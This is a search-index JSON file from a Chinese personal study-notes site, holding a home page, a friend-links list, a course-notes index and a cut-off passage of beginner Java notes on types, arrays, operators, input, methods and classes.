{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":""},{"location":"#_1","title":"\u6b22\u8fce\uff01","text":"<p> \u7ea6 51 \u4e2a\u5b57  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> \u672c\u7ad9\u7edf\u8ba1 <p></p>\u9875\u9762\u6570\uff1a222  \u603b\u5b57\u6570\uff1a390252  <p></p> <p></p> <p>\u4e00\u4e2a\u795e\u5947\u7684 Counter</p> <p> </p> <p></p> \u6709\u5174\u8da3\u4f46\u8fd8\u6ca1\u5b66\u7684\u4e1c\u897f\uff01 <p>- Vue.js, Node.js, Spring</p> <p>- make &amp; cmake \u7ec6\u8282</p> <p>- OS</p> <p>- \u673a\u5668\u5b66\u4e60</p> www.nimisora.top"},{"location":"friend/","title":"\u53cb\u60c5\u94fe\u63a5","text":"<p> \u7ea6 151 \u4e2a\u5b57  8 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> SAVIA\u7684\u5916\u88c5\u4ee3\u8111 \u5185\u542b\u5927\u7269\u8bb2\u4e49\uff0c\u9884\u4e60\u590d\u4e60\u597d\u624b \u730e\u4eba\u7b14\u8bb0 \u53ef\u7231\u72ac\u620e CS\u81ea\u5b66\u6307\u5357 \u6bcf\u4e2a\u8ba1\u79d1\u4eba\u90fd\u5e94\u8be5\u770b\u7684csdiy \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 \u5b66\u957f\u771f\u7684\u597d\u5389\u5bb3\u54c7 Isshiki\u4fee \u6709\u5f88\u591a\u8bfe\u7a0b\u7b14\u8bb0... xiu's space \u54b8\u9c7c\u8086 \u8bfe\u7a0b\u8d44\u6e90\u7d22\u5f15\uff0c\u770b\u770b\u4f1a\u6709\u65b0\u53d1\u73b0 zjuatri \u53ef\u7231\u841d\u535c\u5b50 <p></p> <p>\u5f88\u591a\u4e5f\u5e76\u975e\u53cb\u94fe\uff0c\u53ea\u662f\u65b9\u4fbf\u6211\u53bb\u627e\u7b14\u8bb0\u7684\ud83d\ude2d\uff0c\u5982\u679c\u6709\u95ee\u9898\u7684\u8bdd\u8bf7\u8054\u7cfb\u6211\u5220\u6389</p>"},{"location":"Accumulation/","title":"Index","text":"<p> \u7ea6 54 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u8bfe\u5916\u597d\u50cf\u6ca1\u6709\u5e72\u4ec0\u4e48\u6b38...</p> \u8ba1\u7b97\u673a\u56fe\u5f62\u5b66          <ul> <li> Games101  10828  720  64 mins              1742706994 </li> <li> Games103  6447  79  34 mins              1743922110 </li> <li> Physics-Based Simulation  5588  28 mins              1745229337 </li> <li> Shape Analysis  8034  41 mins              1755667259 </li> <li> LearnOpenGL  15078  1789  98 mins              1742706994 </li> </ul> \u5176\u5b83          <ul> <li> CMU15-445  12985  146  66 mins              1742702901 </li> <li> CS106L  9001  1561  65 mins              1750819866 </li> <li> CSAPP  24381  502  129 mins              1742702901 </li> <li> \u5357\u4eac\u5927\u5b66\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406  7045  211  37 mins              1753026327 </li> <li> Vue.js  2017  431  15 mins              1742989940 </li> </ul>"},{"location":"Accumulation/JAVA/","title":"Java","text":"<p> \u7ea6 2700 \u4e2a\u5b57  778 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 23 \u5206\u949f</p> <p>Quote</p> <p>Java\u548cC++\u4e00\u6837\u662f\u9762\u5411\u5bf9\u8c61\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\uff0c\u800cC\u662f\u9762\u5411\u8fc7\u7a0b\u7684\u8bed\u8a00</p>"},{"location":"Accumulation/JAVA/#hello-world","title":"\u7b2c\u4e00\u4e2a\u7a0b\u5e8f Hello World","text":"<pre><code>public class Hello {  \n    public static void main(String[] args){  \n        System.out.println(\"Hello, World!\");  \n    }  \n}\n</code></pre> <ul> <li>\u5176\u4e2d\uff0c<code>class</code>\u4ee3\u8868\u7c7b\uff0c\u53ef\u4ee5\u770b\u4f5c\u4ee3\u7801\u7684\u5bb9\u5668\uff0c\u6240\u6709\u4ee3\u7801\u90fd\u5e94\u8be5\u653e\u5728\u7c7b\u91cc\u9762\uff0c\u4e00\u4e2a\u6e90\u6587\u4ef6\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\uff0c\u4f46\u662fpublic\u6700\u591a\u80fd\u6709\u4e00\u4e2a\uff0c\u4e14public\u7c7b\u540d\u5e94\u4e0e\u6587\u4ef6\u540d\u5b57\u76f8\u540c\uff0c\u5982\u4e0a\u8ff0\u7a0b\u5e8f\u7684\u6587\u4ef6\u540d\u4e3a<code>Hello.java</code></li> <li><code>main</code>\u662f\u4e3b\u65b9\u6cd5(method)\uff0c\u662f\u7a0b\u5e8f\u7684\u5165\u53e3</li> </ul>"},{"location":"Accumulation/JAVA/#_1","title":"\u7f16\u8bd1\u8fd0\u884c","text":"<p>\u5728\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u6253\u5f00git bash(\u4e5f\u53ef\u4ee5\u4f7f\u7528cmd\u6216\u7ec8\u7aef)\uff0c\u5e76\u8f93\u5165\u4e0b\u8ff0\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1 </p><pre><code>javac Hello.java\n</code></pre> \u53ef\u4ee5\u770b\u5230\u76ee\u5f55\u4e0b\u65b0\u589e\u4e86\u4e00\u4e2a<code>.class</code>\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5982\u679c\u4f60\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u67e5\u770b\u5668\u6253\u5f00\u5b83\uff0c\u4f1a\u53d1\u73b0java\u7f16\u8bd1\u51fa\u6765\u7684\u6587\u4ef6\u5f00\u5934\u90fd\u662f<code>cafe babe</code>\uff0c\u8fd9\u4e5f\u662fjava(\u4e00\u79cd\u5496\u5561)\u540d\u79f0\u7684\u7531\u6765\u3002 <p>\u540c\u6837\u5728\u6587\u4ef6\u76ee\u5f55\u6253\u5f00git bash\uff0c\u5728\u4e0a\u4e00\u6b65\u7684\u57fa\u7840\u4e0a\u8f93\u5165\uff1a </p><pre><code>java Hello\n</code></pre> \u6ce8\u610f\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u540d\uff0c\u4e0d\u7528\u6dfb\u52a0<code>.class</code>\u6216\u8005<code>.java</code>\u3002"},{"location":"Accumulation/JAVA/#_2","title":"\u53d8\u91cf","text":"<p>\u53d8\u91cf\u662f\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u7684\u4e00\u5757\u5b58\u50a8\u7a7a\u95f4\uff0c\u662f\u5b58\u50a8\u6570\u636e\u7684\u57fa\u672c\u5355\u5143</p>"},{"location":"Accumulation/JAVA/#_3","title":"\u53d8\u91cf\u540d","text":"<p>\u53d8\u91cf\u540d\u8bed\u6cd5\u89c4\u5b9a\u57fa\u672c\u4e0eC\u76f8\u540c\uff0c\u4f46\u662f\u8ffd\u52a0\u53ef\u4ee5\u7531\u8d27\u5e01\u7b26\u53f7\u7ec4\u6210</p> <p>Question</p> <p><code>main\u3001String\u3001$8\u3001_3$</code>\u90fd\u662f\u5408\u6cd5\u7684\u53d8\u91cf\u540d</p>"},{"location":"Accumulation/JAVA/#java","title":"Java\u6570\u636e\u7c7b\u578b","text":"<ul> <li>\u57fa\u672c\u6570\u636e\u7c7b\u578b<ul> <li>\u6574\u6570</li> <li>\u5c0f\u6570</li> <li>\u5e03\u5c14</li> <li>\u5b57\u7b26</li> </ul> </li> <li>\u5f15\u7528\u6570\u636e\u7c7b\u578b<ul> <li>\u5b57\u7b26\u4e32</li> <li>\u6570\u7ec4</li> <li>\u5bf9\u8c61</li> </ul> </li> </ul>"},{"location":"Accumulation/JAVA/#_4","title":"\u57fa\u672c\u6570\u636e\u7c7b\u578b\u8868\u683c\uff0c\u5171\u5206\u4e3a\u516b\u79cd\uff1a","text":"\u6570\u636e\u7c7b\u578b \u5927\u5c0f \u8303\u56f4 byte 1 byte \\(-2^{7}\\) to \\(2^{7}-1\\) -128 to 127 short 2 byte \\(-2^{15}\\) to \\(2^{15}-1\\) -32768 to 32767 int 4 byte \\(-2^{31}\\) to \\(2^{31}-1\\) -2147483648 to 2147483647 long 8 \\(-2^{63}\\) to \\(2^{63}-1\\) \u7565 float 4 N/A N/A double 8 N/A N/A char 2 0 to \\(2^{16}-1\\) 0 to 65535 boolean N/A true/false \u9ed8\u8ba4false"},{"location":"Accumulation/JAVA/#_5","title":"\u5f15\u7528\u6570\u636e\u7c7b\u578b","text":"<p>Java\u4e2d\u6570\u7ec4\u5206\u914d\u7a7a\u95f4\u540e\u6709\u9ed8\u8ba4\u503c\uff0c\u6574\u6570\u548cchar\u90fd\u9ed8\u8ba4\u4e3a0\uff0cboolean\u503c\u9ed8\u8ba4\u4e3afalse</p> <ul> <li>\u5b57\u7b26\u4e32\u5b9a\u4e49: <code>String str1 = \"\u4e0d\u60f3\u5b66\u4e60...\";</code><ul> <li>\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83: <code>str1.equals(\"\u60f3\u5b66\u4e60...\")</code>  (False)</li> </ul> </li> <li>\u6570\u7ec4\u5b9a\u4e49:</li> </ul> <pre><code>int[] a = new int[5]; //\u58f0\u660e\u5e76\u4e14\u5206\u914d\u7a7a\u95f4\n\nint[] a; //\u4e5f\u53ef\u4ee5\u5206\u5f00\u6765\u5199\na = new int[5];\n\nSystem.out.println(a.length); //\u8f93\u51fa\u6570\u7ec4\u7684\u957f\u5ea6\n</code></pre> <pre><code>int[] a = new int[]{1,2,3,4,5}; \n//\u4e24\u79cd\u90fd\u53ef\u4ee5\uff0c\u58f0\u660e\u5e76\u4e14\u8d4b\u503c\u4e0d\u53ef\u4ee5\u5206\u5f00\nint[] a = {1,2,3,4,5};\n</code></pre> <ul> <li>\u4e8c\u7ef4\u6570\u7ec4: <pre><code>int[][] array = new int[3][5];\n\nint[][] array = new int[3][];//\u9ad8\u7ef4\u5fc5\u987b\u5199\narray[0] = new int[4];\narray[1] = new int[3];\narray[2] = new int[2];\n//\u4f4e\u7ef4\u53ef\u4ee5\u957f\u5ea6\u4e0d\u4e00\n\nint[][] array = {{1,2},{2,3},{3,4}}\n</code></pre></li> </ul> <p>\u8fd8\u8981\u5bfc\u5165\u5305\u624d\u80fd\u76f4\u63a5\u6253\u5370\u6570\u7ec4 </p><pre><code>import java.util.Arrays;  \n\npublic class Testarray {  \n    public static void main(String[] args){  \n        int[] nums = {1,2,3,4,5};  \n        int[] newnums = new int[10];  \n        for(int i=0;i&lt;nums.length;i++){  \n            newnums[i] = nums[i];  \n        }  \n        nums = newnums; //Java\u7279\u6709\u64cd\u4f5c\uff0c\u7c7b\u4f3c\u6307\u9488  \n        System.out.println(Arrays.toString(nums));  \n        //Output: [1, 2, 3, 4, 5, 0, 0, 0, 0, 0]  \n        System.out.println(Arrays.toString(Arrays.copyOf(newnums,5)));  \n        //\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528Arrays.copyOf()\u65b9\u6cd5\uff0c\u8fd4\u56de\u5e26\u6709\u539f\u503c\u7684\u65b0\u6570\u7ec4\u5b9e\u73b0\u6570\u7ec4\u957f\u5ea6\u66f4\u6539  \n        //Output: [1, 2, 3, 4, 5]  \n        nums = Arrays.copyOf(nums,15);  \n        //Arrays.copyOf()\u65b9\u6cd5\u4e0d\u4f1a\u76f4\u63a5\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4  \n        System.out.println(Arrays.toString(nums));  \n        //Output: [1, 2, 3, 4, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_6","title":"\u7c7b\u578b\u8f6c\u6362","text":"<p>\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u4e0e\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u8bed\u6cd5\u540c C \u76f8\u540c\uff0c\u5982\uff1a </p><pre><code>short s = 123;\nbyte b = (byte)s; //\u6700\u597d\u4e0d\u8981\u9020\u6210\u622a\u65ad\uff0c\u7b26\u53f7\u4f4d\u53d8\u5316\u53ef\u80fd\u4f1a\u53d8\u6210\u8d1f\u6570\n</code></pre>"},{"location":"Accumulation/JAVA/#_7","title":"\u603b\u7ed3","text":"<pre><code>public class TestType {  \n    public static void main(String[] args){  \n        //Test basic data type  \n        byte b1 = 100;  \n        System.out.println(\"b1 = \"+b1);  \n        //Test overflow  \n        byte b2 = (byte)128; //Byte: -128 to 127  \n        System.out.println(\"b2 = \"+b2);  \n        //Output: b2 = -128  \n        //128_2 = 10000000 \u662f -128 \u7684\u8865\u7801 \n\n        long l1 = 1000000000000000000L; //\u540e\u9762\u8981\u52a0L\uff0c\u4e0d\u7136\u7f16\u8bd1\u5668\u4f1a\u8ba4\u4e3a\u662fint\u7c7b\u578b  \n        float f1 = 3.14f; //\u540e\u9762\u8981\u52a0f\uff0c\u4e0d\u7136\u7f16\u8bd1\u5668\u4f1a\u8ba4\u4e3a\u662fdouble\u7c7b\u578b  \n        double d1 = 3.1415926;  \n        System.out.println(\"l1 = \"+l1+\"; f1 = \"+f1+\"; d1 = \"+d1);  \n        //Output: l1 = 1000000000000000000; f1 = 3.14; d1 = 3.1415926  \n\n        char c1 = 'A';  \n        System.out.println(\"c1 = \"+c1);  \n        //Output: c1 = A  \n        System.out.println(\"c1 = \"+(int)c1);  \n        //Output: c1 = 65  \n        System.out.println((int)'\u6b7b');  \n        //Output: 27515 \u8f93\u51fa\u5b57\u7b26\u7684Unicode\u7f16\u7801  \n\n        boolean is_True = true;  \n        System.out.println(\"is_True = \"+is_True); //Boolean\u7c7b\u578b\u4e0d\u80fd\u8f6c\u6362\u6210int\u7c7b\u578b  \n        //Output: is_True = true  \n\n        String myGF = \"\u65b0\u6d77\u5929\";  \n        System.out.println(\"\u6211\u8001\u5a46\u662f \"+myGF);  \n    }  \n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_8","title":"\u8fd0\u7b97\u7b26","text":"<p>\u4f18\u5148\u7ea7</p> <p>\u7b97\u6570\uff1e\u5173\u7cfb\uff1e\u8d4b\u503c \u548c C\u8bed\u8a00 \u76f8\u540c\uff0c\u4f46\u6211\u8001\u662f\u5fd8\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u518d\u63d0\u4e00\u5634</p> <p>\u5982<code>a=b+c&gt;d</code>\u7684\u903b\u8f91\u987a\u5e8f\u4e3a<code>a=((b+c)&gt;d)</code></p> <p>\u7528\u6cd5\u57fa\u672c\u4e0e C\u8bed\u8a00 \u76f8\u540c\uff0c\u6b64\u5904\u4ec5\u5217\u51fa\u7565\u6709\u4e0d\u540c\u7684\u90e8\u5206</p> <pre><code>public class Testop {  \n    public static void main(String[] args){  \n        int a=10,b=8;  \n        System.out.println(\"a+b = \"+a+b);  \n        //Output: a+b = 108 \u8fd9\u662f\u56e0\u4e3a\u5b57\u7b26\u4e32\u7684\u52a0\u6cd5\u4f1a\u5c06\u6574\u4f53\u90fd\u63d0\u5347\u4e3a\u5b57\u7b26\u4e32  \n        System.out.println(\"a+b = \"+(a+b));  \n        //Output: a+b = 18  \n\n        System.out.println(\"a-b = \"+(a-b));  \n        //\u540c\u6837\uff0c\u51cf\u6cd5\u548c\u4e58\u9664\u4e5f\u8981\u52a0\u4e0a\u62ec\u53f7  \n\n        System.out.println(\"a/b = \"+(double)(a/b));  \n        //Output: a/b = 1.0  \n        System.out.println(\"a/b = \"+((double)a/b));  \n        //Output: a/b = 1.25  \n\n        //System.out.println(\"5/0 = \"+(5/0)); //\u8fd0\u884c\u65f6\u4f1a\u663e\u793a\u9519\u8bef  \n        System.out.println(\"-5.0/0 = \"+(-5.0/0));  \n        //Output: -5.0/0 = -Infinity  \n        //\u5728\u5e95\u5c42\u4e8c\u8fdb\u5236\u4e2d\uff0c\u4f1a\u8ba4\u4e3a\u6d6e\u70b9\u6570\u662f\u4e0d\u7cbe\u786e\u7684\uff0c\u56e0\u6b64(5.0/0)\u4e2d\u76840\u5176\u5b9e\u662f\u65e0\u7a77\u5c0f\uff0c\u6240\u4ee5\u7ed3\u679c\u662f\u65e0\u7a77\u5927  \n        System.out.println(\"0.0/0 = \"+(0.0/0));  \n        //Output: 0.0/0 = NaN (Not a Number)  \n    }  \n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_9","title":"\u8f93\u5165\u8f93\u51fa","text":"<pre><code>System.out.print(\"Hello world\"); //\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u53cc\u5f15\u53f7\u91cc\u7684\u5185\u5bb9\uff0c\u6ce8\u610f\u8981\u5e26\u5206\u53f7\nSystem.out.println(\"Hello world\"); //\u52a0\u4e86ln\uff0c\u5219\u4f1a\u5728\u540e\u9762\u81ea\u52a8\u8f93\u51fa\u56de\u8f66\n</code></pre> <p>\u8981\u8c03\u7528\u63a7\u5236\u53f0\u8f93\u5165\uff0c\u9700\u8981\u5148\u5bfc\u5305 <code>import java.util.Scanner;</code></p> <pre><code>import java.util.Scanner;//\u5bfc\u5305  \n\npublic class TestScanner {  \n    public static void  main(String[] args){  \n        Scanner input = new Scanner(System.in);//\u5b9a\u4e49\u626b\u63cf\u4eea  \n\n        System.out.println(\"\u8bf7\u8f93\u5165\u7528\u6237\u540d\uff1a\");//\u63d0\u793a\u8f93\u5165  \n        String username = input.next();//\u4f7f\u7528\u5b57\u7b26\u4e32\u7c7b\u578b\u53bb\u63a5\u6536\u8f93\u5165  \n        char firstChar = username.charAt(0);//\u83b7\u53d6\u7b2c\u4e00\u4e2a\u5b57\u7b26  \n        System.out.println(\"\u7b2c\u4e00\u4e2a\u5b57\u7b26TEST \"+firstChar);  \n        System.out.println(\"\u60a8\u7528\u6237\u540d\u4e3a\"+username);  \n\n        System.out.println(\"\u8bf7\u8f93\u5165\u60a8\u7684ID\uff1a\");  \n        int id = input.nextInt();//\u4f7f\u7528\u6574\u578b\u53bb\u63a5\u6536\u8f93\u5165  \n        System.out.println(\"\u60a8\u7684ID\u4e3a\"+id);  \n\n    }  \n}\n</code></pre> <p>Scanner\u7c7b\u4e2d\u5bf9\u5e94\u7684\u65b9\u6cd5</p> <ul> <li>.nextInt() \u83b7\u5f97\u6574\u6570</li> <li>.nextDouble() \u83b7\u5f97\u5c0f\u6570</li> <li>.next() \u83b7\u5f97\u5b57\u7b26\u4e32</li> <li>.next().charAt(0) \u83b7\u5f97\u5355\u4e2a\u5b57\u7b26</li> </ul>"},{"location":"Accumulation/JAVA/#_10","title":"\u6761\u4ef6\u9009\u62e9\u8bed\u53e5","text":""},{"location":"Accumulation/JAVA/#if-else","title":"if-else \u8bed\u53e5","text":"<p>\u548c C\u8bed\u8a00 \u4e00\u6a21\u4e00\u6837\uff0c\u4e0d\u8bb0\u7b14\u8bb0</p>"},{"location":"Accumulation/JAVA/#switch","title":"switch \u5206\u652f\u7ed3\u6784","text":"<p>\u548c C\u8bed\u8a00 \u4e00\u6a21\u4e00\u6837\uff0c\u4e0d\u8bb0\u7b14\u8bb0</p>"},{"location":"Accumulation/JAVA/#_11","title":"\u5faa\u73af\u8bed\u53e5","text":"<p><code>While</code> <code>do-while</code> <code>for</code>\u5faa\u73af\u90fd\u548c C\u8bed\u8a00 \u4e00\u6a21\u4e00\u6837\uff0c\u4e0d\u8bb0\u7b14\u8bb0</p>"},{"location":"Accumulation/JAVA/#_12","title":"\u65b9\u6cd5(\u9762\u5411\u5bf9\u8c61)/\u51fd\u6570(\u9762\u5411\u8fc7\u7a0b)","text":"<p>\u4e0e C\u8bed\u8a00 \u7c7b\u4f3c\uff0c\u4f46\u4e0d\u7528\u4e8b\u5148\u58f0\u660e</p> <p>\u5982\u4e0b\u8ff0\u65b9\u6cd5\u7528\u6765\u6253\u5370\u5206\u9694\u7b26</p> <pre><code>public static void printsign(int count , char sign){\n    for(int i=0;i&lt;count;i++){\n        System.out.print(sign);\n    }System.out.println();\n}\n</code></pre> <p>\u6709\u8fd4\u56de\u503c\u7684\u65b9\u6cd5 </p><pre><code>public static int add(int a,int b){\n    return a+b;\n}\n</code></pre> <p>\u53ef\u53d8\u53c2\u6570\uff0c\u4f20\u8fdb\u53bb\u53d8\u4e3a\u6570\u7ec4(\u4e5f\u53ef\u4ee5\u76f4\u63a5\u628a\u6570\u7ec4\u4f20\u8fdb\u53bb)</p> <pre><code>import java.util.Arrays;  \n\npublic class Testarray {  \n    public static void main(String[] args){  \n        int[] nums = {1,2,3,4,5};  \n        add(1,2,3,4,5,6);//Output: Sum = 21  \n        add(nums);//Output: Sum = 15  \n    }  \n    public static void add(int... nums){ \n    //\u53ef\u53d8\u53c2\u6570\uff0c\u53ef\u4ee5\u4f20\u4efb\u610f\u6570\u91cf\u53c2\u6570\u8fdb\u53bb\u65b9\u6cd5\u4e2d\uff0c\u5f97\u5230\u4e00\u4e2a\u6570\u7ec4  \n        int sum=0;  \n        for(int i=0;i&lt;nums.length;i++){  \n            sum+=nums[i];  \n        }  \n        System.out.println(\"Sum = \"+sum);  \n    }  \n}\n</code></pre> <p>60-\u6570\u7ec4\u6392\u5e8f_\u54d4\u54e9\u54d4\u54e9_bilibili 2024/5/1 14:06 \u770b\u5230P60 \u6392\u5e8f\u4e86</p>"},{"location":"Accumulation/JAVA/#_13","title":"\u6570\u7ec4\u6392\u5e8f","text":"<p>java\u5185\u7f6e\u5bf9\u6570\u7ec4\u5feb\u901f\u6392\u5e8f\uff0c\u9ed8\u8ba4\u5347\u5e8f</p> <pre><code>import java.util.Arrays;  \n\npublic class TestSort {  \n    public static void main(String[] args){  \n        int[] a={10,9,8,7,6,5,4,3,2,1};  \n        System.out.println(\"\u6392\u5e8f\u524d\uff1a\"+Arrays.toString(a));  \n        //BubbleSort(a);  \n        Arrays.sort(a); //\u5185\u7f6e\u4f18\u5316\u7684\u5feb\u901f\u6392\u5e8f,\u9ed8\u8ba4\u5347\u5e8f\u6392  \n        System.out.println(\"\u6392\u5e8f\u540e\uff1a\"+Arrays.toString(a));  \n    }\n    public static void BubbleSort(int[] nums){  \n        for(int i=0;i&lt;nums.length-1;i++){  \n            for(int j=0;j&lt;nums.length-i-1;j++){  \n                if(nums[j]&gt;nums[j+1]){  \n                    int temp = nums[j];  \n                    nums[j] = nums[j+1];  \n                    nums[j+1] = temp;  \n                }  \n            }  \n        }  \n    }  \n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_14","title":"\u9762\u5411\u5bf9\u8c61","text":"<p>\u7c7b\u662f\u6a21\u677f\uff0c\u5bf9\u8c61\u662f\u7c7b\u7684\u5b9e\u4f8b\u5316\uff0c\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u4ea7\u751f\u591a\u4e2a\u5bf9\u8c61</p>"},{"location":"Accumulation/JAVA/#_15","title":"\u7c7b\u4e0e\u5bf9\u8c61","text":"<p>\u9996\u5148\u5c1d\u8bd5\u5b9a\u4e49\u4e00\u4e2a\u63cf\u8ff0\u72d7\u72d7\u7684\u7c7b:</p> <pre><code>package ObjTest;  //\u90fd\u653e\u5728\u540c\u4e00\u4e2apackage\u4e2d\n\npublic class Dog {  \n    //\u5c5e\u6027  \n    String Name;  //\u7c7b\u7684\u5c5e\u6027\u53ef\u4ee5\u4e0d\u8d4b\u503c\u5c31\u53ef\u4ee5\u5728\u65b9\u6cd5\u4e2d\u8c03\u7528\uff0c\u53d6\u9ed8\u8ba4\u503c(NULL)\n    String Brand;  \n    int Age;  \n    String Color;  \n\n    //\u65b9\u6cd5  \n    public void eat(){\n    //String Name = \"\u62c9\u5e03\u62c9\u591a\"; \u52a0\u4e0a\u8fd9\u53e5\u5c40\u90e8\u53d8\u91cf\u4f1a\u8986\u76d6\u5c5e\u6027\u4e2d\u7684Name \n        System.out.println(Name+\" is eating\");  \n    //System.out.println(this.Name+\" is eating\");\n    //\u52a0\u4e0athis\u5173\u952e\u5b57\u540e\uff0c\u4f1a\u5f3a\u5236\u9009\u62e9\u6210\u5458\u53d8\u91cf\n    }  \n    public void sleep(){  \n        System.out.println(Name+\" is sleeping\");  \n    }  \n}\n</code></pre> <p>\u5728\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u7c7b\u8fdb\u884c\u5b9e\u4f8b\u5316\uff0c\u4ea7\u751f\u5bf9\u8c61 <code>mydog</code></p> <pre><code>package ObjTest;  \n\npublic class ObjectTest {  \n    public static void main(String[] args){  \n        Dog mydog = new Dog();  \n        mydog.Name = \"\u5929\u7fbd\u7f8e\u7fbd\";  \n        mydog.Brand = \"\u67f4\u72ac\";  \n        mydog.Age = 2;  \n        mydog.Color = \"\u767d\u8272\";  \n\n        System.out.println(\"Name:\"+mydog.Name+\"\\tBrand:\"+mydog.Brand+\"\\tAge:\"+mydog.Age+\"\\tColor:\"+mydog.Color);  \n        mydog.eat();  \n        mydog.sleep();  \n/* Output: \nName:\u5929\u7fbd\u7f8e\u7fbd   Brand:\u67f4\u72ac    Age:2   Color:\u767d\u8272\n\u5929\u7fbd\u7f8e\u7fbd is eating\n\u5929\u7fbd\u7f8e\u7fbd is sleeping\n*/\n    }  \n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_16","title":"\u65b9\u6cd5\u91cd\u8f7d","text":"<p>\u5b9a\u4e49</p> <p>\u4e00\u4e2a\u7c7b\u4e2d\u5b9a\u4e49\u591a\u4e2a\u76f8\u540c\u540d\u79f0\u7684\u65b9\u6cd5</p> <pre><code>public void eat(int a){\n    System.out.println(\"\u5403No.\"+a+\"\u836f\u7269\u4e2d......\");\n}\n\npublic void eat(String a){\n    System.out.println(\"\u5403\"+a+\"\u4e2d\");\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_17","title":"\u6784\u9020\u65b9\u6cd5\u91cd\u8f7d","text":"<pre><code>package ObjTest.Stu;  \n\npublic class Student {  \n    //\u5c5e\u6027  \n    String Name;  \n    int Age;  \n\n    //\u6784\u9020\u65b9\u6cd5  \n    public Student(){  \n        System.out.println(\"Student() Executed\");  \n    }  \n    public Student(String Name){  \n        System.out.println(\"Student(String Name) Executed\");  \n        this.Name = Name;  \n    }  \n    public Student(String Name, int Age){  \n        System.out.println(\"Student(String Name, int Age) Executed\");  \n        this.Name = Name;  \n        this.Age = Age;  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Stu;  \n\npublic class ObjectTest2 {  \n    public static void main(String[] args){  \n        Student stu1 = new Student();  \n        Student stu2 = new Student(\"InuiSana\");  \n        Student stu3 = new Student(\"Nimisora\", 2);  \n\n        System.out.println(\"stu1.Name:\"+stu1.Name+\"\\tstu1.Age:\"+stu1.Age);  \n        System.out.println(\"stu2.Name:\"+stu2.Name+\"\\tstu2.Age:\"+stu2.Age);  \n        System.out.println(\"stu3.Name:\"+stu3.Name+\"\\tstu3.Age:\"+stu3.Age);  \n    }  \n}\n\n/* Output: \nStudent() Executed\nStudent(String Name) Executed\nStudent(String Name, int Age) Executed\nstu1.Name:null  stu1.Age:0\nstu2.Name:InuiSana  stu2.Age:0\nstu3.Name:Nimisora  stu3.Age:2\n*/\n</code></pre>"},{"location":"Accumulation/JAVA/#_18","title":"\u9762\u5411\u5bf9\u8c61\u4e09\u5927\u7279\u6027","text":""},{"location":"Accumulation/JAVA/#_19","title":"\u5c01\u88c5","text":"<p>\u8bbf\u95ee\u4fee\u9970\u7b26: private  \u53ef\u5c06\u5c5e\u6027\u4fee\u9970\u4e3a\u79c1\u6709\uff0c\u4ec5\u672c\u7c7b\u53ef\u7528\uff0c\u5b9e\u73b0\u5bf9\u5916\u754c\u9690\u85cf\u5b9e\u73b0\u7ec6\u8282</p> <p>\u5982\uff0c\u5f53\u4f60\u7ed9\u51fa\u4e00\u4e2aStudent\u7684\u7c7b\uff0c\u522b\u4eba\u4f7f\u7528\u65f6\u53ef\u80fd\u4f1a\u8d4b\u503c\u51fa s.Age = 20000 \u7684\u79bb\u8c31\u64cd\u4f5c\uff0c\u4f5c\u4e3a\u7c7b\u63d0\u4f9b\u8005\u5e94\u5f53\u5728\u7c7b\u4e2d\u907f\u514d\u8fd9\u79cd\u60c5\u51b5</p> <pre><code>package ObjTest.Stu2;  \n\npublic class Student {  \n    //\u5c5e\u6027  \n    String Name;  \n    private int Age;  \n    int score;  \n\n    //\u65b9\u6cd5  \n    public boolean SetAge(int Age){  \n        if(Age &lt; 0 || Age &gt; 120){  \n            System.out.print(\"\u60a8\u8f93\u5165\u7684\u5e74\u9f84\u8303\u56f4\u6709\u8bef \");  \n            return true;  \n        }  \n        this.Age = Age;  \n        return false;  \n    }  \n    public int GetAge(){  \n        return this.Age;  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Stu2;  \nimport java.util.Scanner;  \n\npublic class ObjectTest3 {  \n    public static void main(String[] args){  \n        Scanner input = new Scanner(System.in);//\u5b9a\u4e49\u626b\u63cf\u4eea  \n\n        Student stu = new Student();  \n        stu.Name = \"InuiSana\";  \n        System.out.println(\"\u8bf7\u8f93\u5165\u5e74\u9f84\uff1a\");  \n        while(stu.SetAge(input.nextInt())){  \n            System.out.println(\"\u8bf7\u91cd\u65b0\u8f93\u5165\u5e74\u9f84\uff1a\");  \n        }  \n        stu.score = 100;  \n\n        